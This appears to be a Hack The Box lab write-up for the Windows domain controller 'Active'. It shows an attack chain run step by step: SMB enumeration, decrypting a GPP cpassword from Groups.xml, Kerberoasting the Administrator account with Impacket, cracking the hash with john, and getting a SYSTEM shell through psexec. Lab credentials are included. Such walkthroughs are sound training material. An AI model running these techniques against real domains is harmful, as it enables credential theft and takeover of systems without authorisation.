## ---------------->> Active <<----------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.100 -p-
------

    Host is up (0.32s latency).
    Not shown: 65512 closed ports
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    | dns-nsid: 
    |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-21 01:38:02Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5722/tcp  open  msrpc         Microsoft Windows RPC
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49152/tcp open  msrpc         Microsoft Windows RPC
    49153/tcp open  msrpc         Microsoft Windows RPC
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc         Microsoft Windows RPC
    49169/tcp open  msrpc         Microsoft Windows RPC
    49171/tcp open  msrpc         Microsoft Windows RPC
    49182/tcp open  msrpc         Microsoft Windows RPC
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2021-08-21T01:39:00
    |_  start_date: 2021-08-21T01:21:20

// We can see that smb service is active

// Lets see if we can see shared directories with [smbmap](https://github.com/ShawnDEvans/smbmap)

    $ smbmap -H 10.10.10.100
------

    [+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
            Disk                                                  	Permissions	Comment
      ----                                                  	-----------	-------
      ADMIN$                                            	NO ACCESS	Remote Admin
      C$                                                	NO ACCESS	Default share
      IPC$                                              	NO ACCESS	Remote IPC
      NETLOGON                                          	NO ACCESS	Logon server share 
      Replication                                       	READ ONLY	
      SYSVOL                                            	NO ACCESS	Logon server share 
      Users                                             	NO ACCESS	

// There is one directory that we have read permissions - Replication 

// Lets search recursivly this directory with [smbmap](https://github.com/ShawnDEvans/smbmap)

    $ smbmap -H 10.10.10.100 -R Replication

// After some search the most interesting file is in Groups folder and called 'Groups.xml'

    $ smbmap -H 10.10.10.100 -R Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/
-------

    [+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
            Disk                                                  	Permissions	Comment
      ----                                                  	-----------	-------
      Replication                                       	READ ONLY	
      .\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
      dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
      dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
      dr--r--r--                0 Sat Jul 21 06:37:44 2018	Groups
      .\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
      dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
      dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
      fr--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml

// Lets download him 

    $ smbmap -H 10.10.10.100 --download 'Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml'
-------

    [+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
    [+] File output to: /home/r4r3/Desktop/GitHub/HTB/Machines/Windows/Easy/Active/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml

    $ ls
     10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml

// And see the content 

    $ cat 10.10.10.100-Replication_active.htb_Policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_MACHINE_Preferences_Groups_Groups.xml 
-------

    <?xml version="1.0" encoding="utf-8"?>
    <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
    </Groups>

// We can see the domain name is 'active.htb', Also, 

// Every time a new [GPP](https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)(Group Policy Preference) is created, an xml file will created in the SYSVOL with all GPP passwords.

// After that the passwords ecrypted with Microsoft AES as cpassword. 

// The encryption key have [published](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)
// We can decrypt the password with [gpp-decryot tool](https://tools.kali.org/password-attacks/gpp-decrypt)

    $ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
-----

    GPPstillStandingStrong2k18

// We got SVC_TGS password !

    SVC_TGS : GPPstillStandingStrong2k18

// Now we got user credentials, we can see his share files with smbmap 

    $ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
------

    [+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        ADMIN$                                            	NO ACCESS	Remote Admin
        C$                                                	NO ACCESS	Default share
        IPC$                                              	NO ACCESS	Remote IPC
        NETLOGON                                          	READ ONLY	Logon server share 
        Replication                                       	READ ONLY	
        SYSVOL                                            	READ ONLY	Logon server share 
        Users                                             	READ ONLY	

// And we can get the user flag

    $ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --download 'Users/SVC_TGS/Desktop/user.txt'
------

    [+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
    [+] File output to: /home/r4r3/Desktop/GitHub/HTB/Machines/Windows/Easy/Active/10.10.10.100-Users_SVC_TGS_Desktop_user.txt

    $ cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt 

    86d67d8..........

### ------Privilleges Escalation------

---Exploit kerberos---

    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-21 01:38:02Z)

//Kerberos is a protocol for authentication used in Windows Active Directory environments.

// In 2014, Tim Medin presented an attack on Kerberos he called Kerberoasting. It’s worth reading through the presentation,

// as Tim uses good graphics to illustrate the process, but I’ll try to give a simple overview.

---------
// When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate.

// It encrypts a response to you with the service user’s password hash. You send that response to the service,

// which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

--------
// In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service,

//you will use off-line brute force to crack the password associated with the service.

---------
// Most of the time you will need an active account on the domain in order to initial Kerberoast,

// but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled,

// it is possible to request and receive a ticket to crack without a valid account on the domain

---------
// We can enumerate users with Impacket tool [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)

    $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile TGSs.out
-------

    Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

    ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
    --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
    active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             
// found user Administrator now we can see the output file

    $ cat TGSs.out 
-----

    $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0a3618a439425010957d385e56825551$07db537e0cf4aeecfda7d5444ce972b3fec8da305fa9196455a60c11ef07b4ca671eb50cf343d4119aa28cc17f61cc33a714f678e203f1c9bfc38e4c0eaf2d2ebca1ef2e1850d18c9055db304877901796c2f430968a1f5ee2ca624d4d2b4b2ca831258f7289bd1c1a539883d04afcc9327dbae....


https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

// We can see the hash starts with 'krb5tgs'

// [john](https://github.com/openwall/john) have this format, Lets decrypt that hash

    $ john --format=krb5tgs --wordlist=/home/r4r3/Desktop/HTB/wordlists--/rockyou.txt TGSs.out 
---------

    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Ticketmaster1968 (?)
    1g 0:00:00:11 DONE (2021-08-22 00:30) 0.09000g/s 948513p/s 948513c/s 948513C/s Tiffani1432..Thrash1
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

// We got Administrator password: Ticketmaster1968 

// For a shell we can use impacket tool [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

    $ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
--------

    Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

    [*] Requesting shares on 10.10.10.100.....
    [*] Found writable share ADMIN$
    [*] Uploading file FgXeNmIe.exe
    [*] Opening SVCManager on 10.10.10.100.....
    [*] Creating service Xoni on 10.10.10.100.....
    [*] Starting service Xoni.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Windows\system32>whoami
    nt authority\system

// We got shell as NT/SYSTEM !!, And root flag !

    C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt

    b5fc76d1..........
